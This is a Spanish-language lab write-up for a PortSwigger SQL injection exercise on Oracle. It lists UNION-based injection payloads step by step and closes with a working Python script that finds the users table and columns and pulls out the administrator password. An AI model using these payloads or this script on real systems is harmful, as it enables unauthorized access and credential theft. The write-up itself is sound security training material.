---
title: "10 SQL injection attack, listing the database contents on Oracle"
collection: publications
category: portswigger
permalink: publications/SQLi/10_SQL injection attack, listing the database contents on Oracle
excerpt: 'Este laboratorio contiene una vulnerabilidad de inyección SQL en el campo de categoría de producto. Para resolver el laboratorio, realizamos un ataque de inyección SQL basado en UNION en una base de datos Oracle que recupera los nombres de usuario y las contraseñas de todos los usuarios de la aplicación.'
date: 2024-12-01
#venue: 'Journal 1'
#slidesurl: 'http://academicpages.github.io/files/slides1.pdf'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
citation: 'SQL injection attack, listing the database contents on Oracle'
---

![logo]({{site.url}}/images/SQLi/sqli-10/logo.png)

## Descripción del laboratorio

![Descripción]({{site.url}}/images/SQLi/sqli-10/descripcion.png)

## Objetivo del laboratorio

Para resolver el laboratorio, inicia sesión como usuario administrador.

## Determinamos que el campo si es vulnerable

```javascript
' or 1=1--
```

![Vulnerable]({{site.url}}/images/SQLi/sqli-10/vulnerable.png)

## Determinar el numero de columnas retornadas por la consulta

Miramos la cantidad decolumnas retornar hasta que arroje error. Vemos que nos arroja 2 columnas.

```javascript
' ORDER BY 1--
' ORDER BY 2--
```

![Order by]({{site.url}}/images/SQLi/sqli-10/order by.png)

## Miramos que columna es de tipo 'String'

Inyectamos en cada una de ellas mirando cual podemos inyectar 'String', ya que es una BD oracle debemos llamar la  tabla DUAL

```javascript
' UNION SELECT 'A', NULL FROM DUAL--
' UNION SELECT NULL, 'A' FROM DUAL-- 
' UNION SELECT 'A', 'A' FROM DUAL--
```

![String]({{site.url}}/images/SQLi/sqli-10/campo string.png)

## Miramos la versión de la BD

[Hoja de Trucos](https://portswigger.net/web-security/sql-injection/cheat-sheet)

Ya que sabemos que es una BD de Oracle probamos averiguar la versión de Oracle

```javascript
' UNION SELECT banner, NULL FROM v$version--
```

![version]({{site.url}}/images/SQLi/sqli-10/version.png)

## Obtenemos todas las tablas

Ya sabemos que es una BD Oracle debemos listar las tablas

```javascript
' UNION SELECT table_name, NULL FROM all_tables--
```

```Tabla
USERS_HZTDAO
```

![tablas]({{site.url}}/images/SQLi/sqli-10/tablas.png)

## Obtenemos el nombre de las columnas

Ya sabemos que la tabla se llama `USERS_HZTDAO` ahora listamos las filas de la tabla

```javascript
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_HZTDAO'--
```

```
USERNAME_PFWFAV
PASSWORD_RXDLTE
```

![nombre columnas]({{site.url}}/images/SQLi/sqli-10/nombre columnas.png)

## Listamos el usuario y password

```javascript
' UNION select USERNAME_PFWFAV, PASSWORD_RXDLTE from USERS_HZTDAO--
```

![Password]({{site.url}}/images/SQLi/sqli-10/password.png)

## Realizamos Login

![Login]({{site.url}}/images/SQLi/sqli-10/login.png)

## Resuelto

![Login]({{site.url}}/images/SQLi/sqli-10/Aprobado.png)

# Codigo Python
```python
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def perform_request(url, sql_payload):
    path = "/filter?category=Gifts"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    return r.text

def sqli_users_table(url):
    sql_payload = "' UNION SELECT table_name, NULL FROM all_tables--"
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    users_table = soup.find(text=re.compile('^USERS\_.*'))
    return users_table

def sqli_users_columns(url, users_table):
    sql_payload = "' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = '%s'-- " % users_table
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    username_column = soup.find(text=re.compile('.*USERNAME.*'))
    password_column = soup.find(text=re.compile('.*PASSWORD.*'))
    return username_column, password_column

def sqli_administrator_cred(url, users_table, username_column, password_column):
    sql_payload = "' UNION select %s, %s from %s--" % (username_column, password_column, users_table)
    res = perform_request(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    admin_password = soup.find(text="administrator").parent.findNext('td').contents[0]
    return admin_password

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("Looking for the users table...")
    users_table = sqli_users_table(url)
    if users_table:
        print("Found the users table name: %s" % users_table)
        username_column, password_column = sqli_users_columns(url, users_table)
        if username_column and password_column:
            print("Found the username column name: %s " % username_column)
            print("Found the password column name: %s" % password_column)

            admin_password = sqli_administrator_cred(url, users_table, username_column, password_column)
            if admin_password:
                print("[+] The administrator password is: %s " % admin_password)
            else:
                print("Did not find the administrator password")
        else:
            print("Did not find the username and/or the password columns")
    else:
        print("Did not find a users table.")
```